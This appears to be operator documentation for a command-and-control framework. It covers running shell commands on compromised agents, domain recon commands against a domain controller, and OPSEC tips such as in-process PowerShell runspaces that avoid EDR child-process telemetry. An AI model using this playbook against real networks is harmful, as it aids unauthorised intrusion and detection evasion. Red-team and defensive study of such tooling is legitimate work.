# Command Execution

Three ways to run commands on agents: interactive shell, single-shot `cmd`, and asynchronous queuing.

---

## Interactive Shell

Opens a persistent shell loop where you type commands and see output immediately.

```
❯ shell a1b2
  shell  a1b2c3d4  · exit to quit

[a1b2c3d4] › whoami
corp\svc_backup

[a1b2c3d4] › hostname
WIN-DC01

[a1b2c3d4] › ipconfig /all

Windows IP Configuration
   Host Name . . . . . . . . . : WIN-DC01
   Primary Dns Suffix  . . . . : corp.local
   ...

[a1b2c3d4] › exit
```

**When to use:** Exploratory recon, when you need to run several commands in sequence quickly, or when you want immediate feedback. Each command goes through a full beacon cycle (agent polls → executes → submits result), so response time equals beacon interval.

**OPSEC note:** Each command in shell mode generates a separate beacon cycle. On a 30s beacon interval, 10 commands = 5 minutes of activity. For time-sensitive or OPSEC-sensitive operations, use `--no-wait` to queue in bulk.

---

## Single Command (`cmd`)

Execute one command and wait for the result.

```
❯ cmd a1b2 "whoami /all"
[*] Executing command on agent a1b2c3d4-...
```

**Output (after beacon cycle):**
```
USER INFORMATION
----------------
User Name        SID
================ =============================================
corp\svc_backup  S-1-5-21-3623811015-3361044348-30300820-1013

GROUP INFORMATION
-----------------
Group Name                              Type             SID
======================================= ================ ====
corp\Domain Users                       Group            S-1-5-21-...
...
```

### Wait Options

```bash
# Wait up to 60 seconds for result (default: 300s)
❯ cmd a1b2 "dir C:\Users" --timeout 60

# Queue without waiting — returns immediately with cmd-id
❯ cmd a1b2 "net user /domain" --no-wait
[+] Command queued. Command ID: d4e5f6a7-...

# Run in background (agent executes, result collected separately)
❯ cmd a1b2 "whoami" --background
```

### Working Directory

```bash
❯ cmd a1b2 "dir" --workdir "C:\Users\jsmith\Documents"
```

---

## Checking Command Status

All commands return a `cmd-id`. Use it to retrieve results at any time.

```
❯ status d4e5f6a7
[*] Checking status for command: d4e5f6a7-...

Status: completed
Exit Code: 0

Output:
corp\svc_backup
```

**Status values:**

| Status | Meaning |
|--------|---------|
| `pending` | Queued, not yet picked up by agent |
| `executing` | Agent has the command, result not yet submitted |
| `completed` | Result received, exit code 0 |
| `failed` | Result received, non-zero exit code |
| `timeout` | Agent did not respond within timeout |

---

## Command History

```
❯ history a1b2
❯ history a1b2 --limit 10
```

**Output:**
```
[+] Found 47 command(s) in history.

CMD ID                               TIMESTAMP          STATUS     EXIT  COMMAND
------------------------------------------------------------------------------------------------------------
d4e5f6a7-...                        04-25 14:22:55     completed   0    whoami /all
e5f6a7b8-...                        04-25 14:20:11     completed   0    net localgroup administrators
f6a7b8c9-...                        04-25 14:18:30     failed      1    net user /domain
```

---

## Common Recon Commands

Run these at the start of every session to orient yourself.

```bash
# Who are we and what privileges?
❯ cmd a1b2 "whoami /all"

# Network configuration
❯ cmd a1b2 "ipconfig /all"

# Local admin group
❯ cmd a1b2 "net localgroup administrators"

# Active sessions
❯ cmd a1b2 "net session"

# Domain info (if domain-joined)
❯ cmd a1b2 "nltest /dclist:corp.local"

# ARP table — who's on the network
❯ cmd a1b2 "arp -a"

# Active connections
❯ cmd a1b2 "netstat -ano"

# Running services
❯ cmd a1b2 "sc query type= all state= all"

# Installed software
❯ cmd a1b2 "wmic product get name,version"
```

---

## PowerShell Execution

The agent dispatches commands through `cmd.exe /C` by default. For PowerShell:

```bash
# Method 1: invoke powershell explicitly
❯ cmd a1b2 "powershell -NonInteractive -Command \"Get-Process | Select-Object Name,Id\""

# Method 2: use PS runspace (no child process spawned)
# This executes PowerShell in-process via the PS API — quieter
❯ cmd a1b2 "ps:Get-ADUser -Filter * -Properties *" --method ps-runspace
```

**OPSEC comparison:**
- `cmd /C powershell -Command ...` — spawns a child `powershell.exe` process, visible in process tree and EDR telemetry
- PS runspace (`--method ps-runspace`) — executes PowerShell code within the agent's own process memory, no child process created

---

## Clearing the Queue

If you've queued many commands and want to cancel them before the agent picks them up:

```
❯ queue clear a1b2
[!] Attempting to clear command queue for agent a1b2c3d4...
[+] Queue cleared.
```

**When to use:** Agent is going offline, you made a mistake in a queued command, or you want to abort a planned sequence.
